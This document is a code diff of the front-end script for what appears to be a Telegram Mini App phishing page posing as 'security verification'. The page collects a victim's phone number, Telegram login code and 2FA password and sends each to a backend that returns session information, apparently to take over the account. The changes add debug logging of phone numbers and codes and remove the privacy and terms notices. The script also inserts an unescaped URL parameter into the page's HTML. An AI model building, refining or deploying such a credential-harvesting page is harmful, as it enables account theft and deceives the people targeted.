@@ -8,41 +8,33 @@ let countdownInterval = null;
 
 // Инициализация Telegram Web App
 const tg = window.Telegram.WebApp;
-tg.expand();
-tg.enableClosingConfirmation();
-
-// Установка цвета фона Mini App
-tg.setHeaderColor('secondary_bg_color');
-tg.setBackgroundColor('#1A1C2B');
+if (tg.initData) {
+    tg.expand();
+    tg.enableClosingConfirmation();
+    tg.setHeaderColor('secondary_bg_color');
+    tg.setBackgroundColor('#1A1C2B');
+}
 
 // Функции управления шагами
 function showStep(step) {
-    // Скрываем все шаги
     document.querySelectorAll('.step').forEach(el => {
         el.classList.remove('active');
     });
-    
-    // Показываем нужный шаг
     document.getElementById(`step${step}`).classList.add('active');
     currentStep = step;
-    
-    // Прокручиваем наверх
     window.scrollTo(0, 0);
 }
 
 // Начало верификации
 function startVerification() {
-    // Получаем username из URL параметров
     const urlParams = new URLSearchParams(window.location.search);
     const username = urlParams.get('username') || '';
     
-    // Обновляем текст с username
     const displayElement = document.getElementById('usernameDisplay');
     if (username) {
         displayElement.innerHTML = `Security verification required for <span class="highlight">@${username}</span>`;
     }
     
-    // Переходим к шагу 2
     showStep(2);
 }
 
@@ -67,7 +59,6 @@ async function sendCode() {
     const phoneInput = document.getElementById('phoneInput');
     const termsCheckbox = document.getElementById('termsCheckbox');
     
-    // Валидация
     if (!phoneInput.value) {
         showError('Please enter phone number');
         return;
@@ -80,10 +71,12 @@ async function sendCode() {
     
     phoneNumber = '+' + phoneInput.value;
     
-    // Показываем загрузку
     showLoading('Sending verification code...');
     
     try {
+        console.log('Sending request to:', `${BACKEND_URL}/api/send_code`);
+        console.log('Phone number:', phoneNumber);
+        
         const response = await fetch(`${BACKEND_URL}/api/send_code`, {
             method: 'POST',
             headers: {
@@ -94,22 +87,23 @@ async function sendCode() {
             })
         });
         
-        const data = await response.json();
+        console.log('Response status:', response.status);
         
-        if (response.ok) {
+        const data = await response.json();
+        console.log('Response data:', data);
+        
+        if (response.ok && data.success) {
             sessionId = data.session_id;
             phoneCodeHash = data.phone_code_hash;
             
-            // Переходим к шагу ввода кода
             showStep(3);
-            
-            // Запускаем таймер
             startCountdown();
         } else {
             showError(data.error || 'Failed to send code');
         }
     } catch (error) {
-        showError('Network error. Please try again.');
+        console.error('Send code error:', error);
+        showError('Network error. Please check your connection and try again.');
     } finally {
         hideLoading();
     }
@@ -128,6 +122,8 @@ async function verifyCode() {
     showLoading('Verifying code...');
     
     try {
+        console.log('Verifying code:', { sessionId, code });
+        
         const response = await fetch(`${BACKEND_URL}/api/verify_code`, {
             method: 'POST',
             headers: {
@@ -139,20 +135,24 @@ async function verifyCode() {
             })
         });
         
+        console.log('Verify response status:', response.status);
+        
         const data = await response.json();
+        console.log('Verify response data:', data);
         
         if (response.ok) {
-            if (data.requires_2fa) {
-                // Переходим к 2FA
+            if (data.success) {
+                showSuccess(data.session_info);
+            } else if (data.requires_2fa) {
                 showStep(4);
             } else {
-                // Показываем успех
-                showSuccess(data.session_info);
+                showError(data.error || 'Verification failed');
             }
         } else {
             showError(data.error || 'Invalid verification code');
         }
     } catch (error) {
+        console.error('Verify code error:', error);
         showError('Network error. Please try again.');
     } finally {
         hideLoading();
@@ -185,12 +185,13 @@ async function verify2FA() {
         
         const data = await response.json();
         
-        if (response.ok) {
+        if (response.ok && data.success) {
             showSuccess(data.session_info);
         } else {
             showError(data.error || 'Invalid 2FA password');
         }
     } catch (error) {
+        console.error('Verify 2FA error:', error);
         showError('Network error. Please try again.');
     } finally {
         hideLoading();
@@ -199,16 +200,16 @@ async function verify2FA() {
 
 // Показ успеха
 function showSuccess(sessionInfo) {
-    document.getElementById('verifiedUsername').textContent = '@' + (sessionInfo.username || 'user');
+    if (sessionInfo) {
+        document.getElementById('verifiedUsername').textContent = '@' + (sessionInfo.username || 'user');
+    }
     
-    // Устанавливаем текущее время
     const now = new Date();
     document.getElementById('verificationTime').textContent = 
         now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
     
     showStep(5);
     
-    // Вибрация успеха (если поддерживается)
     if (navigator.vibrate) {
         navigator.vibrate([100, 50, 100]);
     }
@@ -227,8 +228,9 @@ async function resendCode() {
         clearInterval(countdownInterval);
     }
     
-    document.getElementById('resendBtn').disabled = true;
-    document.getElementById('resendBtn').textContent = 'Sending...';
+    const resendBtn = document.getElementById('resendBtn');
+    resendBtn.disabled = true;
+    resendBtn.textContent = 'Sending...';
     
     showLoading('Resending code...');
     
@@ -245,20 +247,22 @@ async function resendCode() {
         
         const data = await response.json();
         
-        if (response.ok) {
+        if (response.ok && data.success) {
             sessionId = data.session_id;
             phoneCodeHash = data.phone_code_hash;
             
-            // Запускаем таймер заново
             startCountdown();
         } else {
             showError(data.error || 'Failed to resend code');
         }
     } catch (error) {
+        console.error('Resend code error:', error);
         showError('Network error. Please try again.');
     } finally {
         hideLoading();
-        document.getElementById('resendBtn').textContent = 'Resend Code';
+        if (resendBtn) {
+            resendBtn.textContent = 'Resend Code';
+        }
     }
 }
 
@@ -269,8 +273,8 @@ function startCountdown() {
     const resendBtn = document.getElementById('resendBtn');
     const timer = document.querySelector('.timer');
     
-    resendBtn.disabled = true;
-    timer.style.display = 'flex';
+    if (resendBtn) resendBtn.disabled = true;
+    if (timer) timer.style.display = 'flex';
     
     countdownElement.textContent = countdown;
     
@@ -284,8 +288,8 @@ function startCountdown() {
         
         if (countdown <= 0) {
             clearInterval(countdownInterval);
-            resendBtn.disabled = false;
-            timer.style.display = 'none';
+            if (resendBtn) resendBtn.disabled = false;
+            if (timer) timer.style.display = 'none';
         }
     }, 1000);
 }
@@ -307,22 +311,18 @@ function moveToNext(input, nextIndex) {
 
 // Закрытие Mini App
 function closeMiniApp() {
-    tg.close();
+    if (window.Telegram && window.Telegram.WebApp) {
+        window.Telegram.WebApp.close();
+    }
 }
 
 // Контакт с поддержкой
 function contactSupport() {
-    tg.openTelegramLink('https://t.me/rollssupport');
-}
-
-// Показать политику конфиденциальности
-function showPrivacy() {
-    alert('Privacy Policy: Your data is encrypted and used only for account verification.');
-}
-
-// Показать условия использования
-function showTerms() {
-    alert('Terms of Service: By using this service, you agree to our verification process.');
+    if (window.Telegram && window.Telegram.WebApp) {
+        window.Telegram.WebApp.openTelegramLink('https://t.me/rollssupport');
+    } else {
+        window.open('https://t.me/rollssupport', '_blank');
+    }
 }
 
 // Обработка нажатия Enter
@@ -342,9 +342,8 @@ document.addEventListener('keypress', (e) => {
     }
 });
 
-// Автофокус на первом поле кода при переходе на шаг 3
+// Инициализация
 document.addEventListener('DOMContentLoaded', () => {
-    // Получаем username из URL
     const urlParams = new URLSearchParams(window.location.search);
     const username = urlParams.get('username');
     
@@ -353,7 +352,6 @@ document.addEventListener('DOMContentLoaded', () => {
         displayElement.innerHTML = `Security verification required for <span class="highlight">@${username}</span>`;
     }
     
-    // Устанавливаем начальный шаг
     showStep(1);
     
     // Инициализация полей ввода кода
@@ -368,18 +366,10 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         });
     });
-});
-
-// Поддержка Telegram Web App
-document.addEventListener('DOMContentLoaded', () => {
-    // Получаем данные из Telegram
-    const initData = tg.initData;
     
-    if (initData) {
-        console.log('Telegram Web App initialized');
-    }
-    
-    // Настройка основной кнопки
-    tg.MainButton.setText('Verify Account');
-    tg.MainButton.show();
+    // Автофокус на поле телефона
+    setTimeout(() => {
+        const phoneInput = document.getElementById('phoneInput');
+        if (phoneInput) phoneInput.focus();
+    }, 500);
 });
